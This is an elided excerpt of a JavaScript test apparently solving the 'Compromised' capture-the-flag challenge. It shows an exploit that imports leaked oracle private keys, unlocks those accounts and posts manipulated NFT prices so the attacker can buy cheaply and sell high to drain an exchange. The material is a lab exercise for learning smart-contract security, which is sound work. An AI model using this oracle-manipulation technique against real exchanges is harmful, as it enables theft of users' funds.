...
describe('Compromised challenge', function() {
	...
	before(async function() {
		...
		// Deploy the oracle and setup the trusted sources with initial prices -999.
		...
		this.exchange = await Exchange.new(this.oracle.address, {
			from: deployer,
			value: EXCHANGE_INITIAL_ETH_BALANCE // 10000
		});
		//Token instance.
	...
	it('Exploit', async function() {
		...
		// Private keys from the leaked server.
		const pks = [
		...
		//importRawKey - Imports the given private key into the key store, encrypting it with the passphrase.
		...
		//Signs data using a specific account. oracle1 : address , 'yolo' : password , unlockDuration  : 100
		await web3.eth.personal.unlockAccount(oracle1, 'yolo', 100);
		await web3.eth.personal.unlockAccount(oracle2, 'yolo', 100);
		// Post price as 0 from oracle.
		...
		// Post price as 10000 from oracle.
		...
		// exchange to use 1 token.
		await this.token.approve(this.exchange.address, 1, { from: attacker });
		// Sell NFT token ID - 1.
		await this.exchange.sellOne(1, { from: attacker });
	});
	/*
Used the private to change the price of NFT, buy when it's low and sell when it's high.
*/
